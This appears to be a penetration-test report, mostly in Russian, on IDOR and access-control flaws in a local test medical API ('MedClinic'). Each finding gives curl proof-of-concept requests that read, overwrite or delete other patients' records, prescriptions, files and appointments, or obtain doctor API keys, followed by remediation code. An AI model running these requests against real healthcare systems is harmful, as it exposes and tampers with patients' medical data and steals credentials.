# IDOR Vulnerability Report — MedClinic
**Дата:** 2026-04-12  
**Метод:** Dynamic black-box testing (idor-testing skill by zebbern)  
**Таргет:** `http://localhost:8000`  
**Тестовые аккаунты:** john@patient.com (user_id=1), jane@patient.com (user_id=2)  
**Скоуп:** Insecure Direct Object Reference (IDOR)

---

## Executive Summary

Обнаружено **13 IDOR-уязвимостей** и **2 BAC-уязвимости** в 9 различных endpoint-группах.  
Пациент может читать и **модифицировать** медицинские данные любого другого пациента.  
Обнаружен новый вектор (не найденный в предыдущих ревью): запись в чужой профиль пациента и appointments.

**Ключевые находки:**
- Write-IDOR: `PUT /api/patients/{id}` — john изменил `allergies` Jane на произвольное значение ✓ подтверждено
- Write-IDOR: `PUT /api/appointments/{id}` — john изменил notes чужого appointment ✓ подтверждено  
- Delete-IDOR: `DELETE /api/appointments/{id}` — john удалил appointment Jane ✓ подтверждено
- Mass disclosure: `GET /api/appointments/` возвращает ALL appointments любому пользователю
- BAC: `GET /api/admin/stats` и `/api/admin/users/{id}` доступны patient-роли

---

## Тестовая матрица

| # | Endpoint | Метод | Тип | Результат |
|---|----------|-------|-----|-----------|
| T-01 | `/api/patients/{id}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-02 | `/api/records/patient/{id}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-03 | `/api/records/{id}` | GET | Read IDOR | ✅ УЯЗВИМ (частично) |
| T-04 | `/api/prescriptions/patient/{id}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-05 | `/api/prescriptions/{uuid}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-06 | `/api/files/{id}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-07 | `/api/files/download/{filename}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-08 | `/api/patients/` | GET | Mass Disclosure | ✅ УЯЗВИМ |
| T-09 | `/api/patients/{id}` | PUT | **Write IDOR** | ✅ УЯЗВИМ |
| T-10 | `/api/appointments/` | GET | Mass Disclosure | ✅ УЯЗВИМ |
| T-11 | `/api/appointments/{id}` | GET | Read IDOR | ✅ УЯЗВИМ |
| T-12 | `/api/appointments/{id}` | PUT | **Write IDOR** | ✅ УЯЗВИМ |
| T-13 | `/api/appointments/{id}` | DELETE | **Delete IDOR** | ✅ УЯЗВИМ |
| T-14 | `/api/admin/stats` | GET | BAC | ✅ УЯЗВИМ |
| T-15 | `/api/admin/users/{id}` | GET | BAC (API key leak) | ✅ УЯЗВИМ |
| T-16 | `/api/prescriptions/` | GET | — | ✅ Защищён (фильтрует по user) |
| T-17 | `/api/admin/users` (POST) | POST | HTTP Method | ❌ 405 Not Allowed |

---

## Findings

---

### IDOR-001 — Read: Cross-Patient Profile Access

**Severity:** High | **CVSS 3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/patients/{patient_id}`

**PoC:**
```bash
# john (user_id=1) читает профиль jane (patient_id=2)
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/patients/2
```

**Ответ (HTTP 200):**
```json
{"id":2,"name":"Jane Doe","email":"jane@patient.com","date_of_birth":"1992-07-22",
 "blood_type":"O-","allergies":"...","insurance_number":"INS-002-JND",
 "phone":"+1-555-0201","address":"..."}
```

**Impact:** Полное раскрытие PHI (дата рождения, группа крови, аллергии, страховой номер, адрес, контакт экстренной помощи) любого пациента.

---

### IDOR-002 — Read: Cross-Patient Medical Records

**Severity:** High | **CVSS 3.1:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/records/patient/{patient_id}`

**PoC:**
```bash
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/records/patient/2
```

**Ответ (HTTP 200):** Медицинская запись Jane Doe (диагнозы, результаты осмотра Dr. Sarah Connor).

**Root Cause:** `if current_user.role == "patient": pass` — сломанная проверка, `pass` ничего не делает.

---

### IDOR-003 — Read: Direct Record Access by ID

**Severity:** High | **CVSS 3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/records/{record_id}`

**PoC:**
```bash
# john получает запись id=2 (принадлежит Jane)
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/records/2
# → HTTP 200: Jane Doe's record
```

**Примечание:** Записи 1, 3 вернули 404 (удалены в ходе предыдущих тестов).

---

### IDOR-004 — Read: Cross-Patient Prescription Access (by patient_id)

**Severity:** High | **CVSS 3.1:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/prescriptions/patient/{patient_id}`

**PoC:**
```bash
# John читает рецепты Jane (patient_id=2)
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/prescriptions/patient/2
# → Amoxicillin 500mg, Dextromethorphan 30mg

# John читает рецепты Mike (patient_id=3)
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/prescriptions/patient/3
# → Ibuprofen 400mg
```

**Root Cause:** Та же сломанная проверка `if current_user.role == "patient": pass`.

---

### IDOR-005 — Read: Direct Prescription Access by UUID

**Severity:** High | **CVSS 3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/prescriptions/{prescription_id}`

**PoC:**
```bash
# Jane's prescription UUID получен через IDOR-004
JANE_RX_ID="6de105c2-0689-490f-bf75-efcae6a6d010"
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/prescriptions/$JANE_RX_ID
# → HTTP 200: Jane Doe's prescription details
```

**Примечание:** Использование UUID v4 не защищает от IDOR если UUID можно получить через другой уязвимый endpoint (IDOR-004).

---

### IDOR-006 — Read: Cross-User File Metadata

**Severity:** Medium | **CVSS 3.1:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/files/{file_id}`

**PoC:**
```bash
# jane читает метаданные файла john (owner_id=1)
curl -s -H "X-API-Key: pk_patient_jane_456" http://localhost:8000/api/files/1
# → HTTP 200: {"owner_id":1,"filename":"1_bloodwork_results.pdf",...}
```

**Примечание:** Листинг файлов (`GET /api/files/`) фильтруется по пользователю (jane видит только свои), но прямой доступ по `file_id` — нет.

---

### IDOR-007 — Read: Cross-User File Download

**Severity:** High | **CVSS 3.1:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/files/download/{filename}`

**PoC:**
```bash
# jane скачивает PDF-файл john (зная имя файла из IDOR-006)
curl -s -H "X-API-Key: pk_patient_jane_456" \
  "http://localhost:8000/api/files/download/1_bloodwork_results.pdf"
# → HTTP 200: содержимое файла john
```

---

### IDOR-008 — Mass Disclosure: All Patients PII Listing

**Severity:** High | **CVSS 3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-200

**Endpoint:** `GET /api/patients/`

**PoC:**
```bash
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/patients/
```

**Ответ:** Полный список всех пациентов (3 записи) с insurance numbers, addresses, blood types, allergies.

---

### IDOR-009 — **Write IDOR**: Cross-Patient Profile Modification

**Severity:** High | **CVSS 3.1:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-639

**Endpoint:** `PUT /api/patients/{patient_id}`

**PoC:**
```bash
# john изменяет allergies Jane
curl -s -X PUT http://localhost:8000/api/patients/2 \
  -H "X-API-Key: pk_patient_john_123" \
  -H "Content-Type: application/json" \
  -d '{"allergies":"JOHN_WROTE_THIS"}'
# → HTTP 200: Jane's profile updated
```

**Подтверждение:**
```bash
curl -s -H "X-API-Key: pk_patient_jane_456" http://localhost:8000/api/patients/2
# → {"allergies":"JOHN_WROTE_THIS"} ← данные jane изменены
```

**Impact:** Критическая целостность: злоумышленник может изменить медицинские данные пациента — аллергии, группу крови, контакт экстренной помощи — что создаёт непосредственный риск для жизни в production-окружении.

---

### IDOR-010 — Mass Disclosure: All Appointments Listing

**Severity:** High | **CVSS 3.1:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-200

**Endpoint:** `GET /api/appointments/`

**PoC:**
```bash
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/appointments/
```

**Ответ:** 4 записи для 3 разных пациентов (john=1, jane=2, mike=3). Пациент видит расписание всех других пациентов включая имена врачей, даты, заметки.

---

### IDOR-011 — Read: Cross-Patient Appointment Access

**Severity:** Medium | **CVSS 3.1:** 5.4 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)  
**CWE:** CWE-639

**Endpoint:** `GET /api/appointments/{appointment_id}`

**PoC:**
```bash
# john читает appointment jane (id=4)
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/appointments/4
# → HTTP 200: Jane Doe, Dr. Sarah Connor, дата, заметки
```

---

### IDOR-012 — **Write IDOR**: Cross-Patient Appointment Modification

**Severity:** High | **CVSS 3.1:** 7.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)  
**CWE:** CWE-639

**Endpoint:** `PUT /api/appointments/{appointment_id}`

**PoC:**
```bash
# john изменяет notes в appointment jane (id=4)
curl -s -X PUT http://localhost:8000/api/appointments/4 \
  -H "X-API-Key: pk_patient_john_123" \
  -H "Content-Type: application/json" \
  -d '{"notes":"IDOR write test by John"}'
# → HTTP 200: appointment обновлён
```

---

### IDOR-013 — **Delete IDOR**: Cross-Patient Appointment Deletion

**Severity:** High | **CVSS 3.1:** 7.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)  
**CWE:** CWE-639

**Endpoint:** `DELETE /api/appointments/{appointment_id}`

**PoC:**
```bash
# jane создаёт appointment (id=7)
# john удаляет его
curl -s -X DELETE http://localhost:8000/api/appointments/7 \
  -H "X-API-Key: pk_patient_john_123"
# → HTTP 200: {"detail":"Appointment deleted","id":7}
```

---

### BAC-001 — Broken Access Control: Admin Stats Accessible to Patient

**Severity:** Medium | **CVSS 3.1:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N)  
**CWE:** CWE-284

**Endpoint:** `GET /api/admin/stats`

**PoC:**
```bash
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/admin/stats
```

**Ответ (HTTP 200):**
```json
{"total_users":19,"total_patients":5,"total_doctors":4,"total_nurses":3,
 "total_receptionists":2,"total_admins":5,"total_appointments":4,"total_prescriptions":4,"total_records":3}
```

**Impact:** Раскрывает точную структуру базы данных, количество привилегированных аккаунтов.

---

### BAC-002 — Broken Access Control: Admin User Endpoint Leaks Doctor API Keys

**Severity:** High | **CVSS 3.1:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-284

**Endpoint:** `GET /api/admin/users/{user_id}`

**PoC:**
```bash
# john (patient) читает профиль Dr. Sarah Connor (user_id=4)
curl -s -H "X-API-Key: pk_patient_john_123" http://localhost:8000/api/admin/users/4
# → HTTP 200: {"email":"sarah@doctor.com","role":"doctor","api_key":"pk_doctor_sarah_111",...}
```

**Impact:** Patient может перебрать user_id 1..N и получить API keys всех врачей и администраторов.

---

## Что защищено

| Endpoint | Результат | Примечание |
|----------|-----------|------------|
| `GET /api/prescriptions/` | Защищён | Фильтрует только рецепты текущего пользователя |
| `POST /api/admin/users` | 405 Method Not Allowed | HTTP method switching не работает |

---

## Summary Table

| ID | Тип | Severity | CVSS | Endpoint | Статус |
|----|-----|----------|------|----------|--------|
| IDOR-001 | Read | High | 6.5 | GET /api/patients/{id} | CONFIRMED |
| IDOR-002 | Read | High | 7.5 | GET /api/records/patient/{id} | CONFIRMED |
| IDOR-003 | Read | High | 6.5 | GET /api/records/{id} | CONFIRMED |
| IDOR-004 | Read | High | 7.5 | GET /api/prescriptions/patient/{id} | CONFIRMED |
| IDOR-005 | Read | High | 6.5 | GET /api/prescriptions/{uuid} | CONFIRMED |
| IDOR-006 | Read | Medium | 5.3 | GET /api/files/{id} | CONFIRMED |
| IDOR-007 | Read | High | 7.5 | GET /api/files/download/{filename} | CONFIRMED |
| IDOR-008 | Mass Disclosure | High | 6.5 | GET /api/patients/ | CONFIRMED |
| IDOR-009 | **Write** | High | 8.1 | PUT /api/patients/{id} | CONFIRMED |
| IDOR-010 | Mass Disclosure | High | 6.5 | GET /api/appointments/ | CONFIRMED |
| IDOR-011 | Read | Medium | 5.4 | GET /api/appointments/{id} | CONFIRMED |
| IDOR-012 | **Write** | High | 7.1 | PUT /api/appointments/{id} | CONFIRMED |
| IDOR-013 | **Delete** | High | 7.1 | DELETE /api/appointments/{id} | CONFIRMED |
| BAC-001 | BAC | Medium | 5.3 | GET /api/admin/stats | CONFIRMED |
| BAC-002 | BAC | High | 7.5 | GET /api/admin/users/{id} | CONFIRMED |

**Итого:** 15 finding | 11 High, 3 Medium, 0 Critical (в скоупе IDOR/BAC)

---

## Remediation

### Единое решение — Ownership Check Pattern

```python
# Для ВСЕХ resource endpoints добавить проверку:
def get_patient_resource(patient_id: int, current_user = Depends(get_current_user)):
    if current_user.role == "patient" and current_user.patient_id != patient_id:
        raise HTTPException(status_code=403, detail="Forbidden")
    # continue...
```

### Приоритетные исправления

| Priority | Endpoint | Fix |
|----------|----------|-----|
| P0 | PUT /api/patients/{id} | Проверять `patient.user_id == current_user.id` ИЛИ `role == admin` |
| P0 | DELETE /api/appointments/{id} | Проверять `appt.patient_id == current_user.patient_id` |
| P0 | PUT /api/appointments/{id} | То же |
| P1 | GET /api/patients/{id}, /api/records/patient/{id} | Заменить `pass` на ownership check |
| P1 | GET /api/appointments/ | Фильтровать по `current_user.patient_id` для роли `patient` |
| P1 | GET /api/admin/stats, /api/admin/users/{id} | `require_role(["admin"])` |
| P2 | UUID для файлов | Добавить owner validation |

---

*Отчёт создан по методологии idor-testing skill (zebbern)*  
*Дата: 2026-04-12 | Аккаунты: john@patient.com / jane@patient.com*
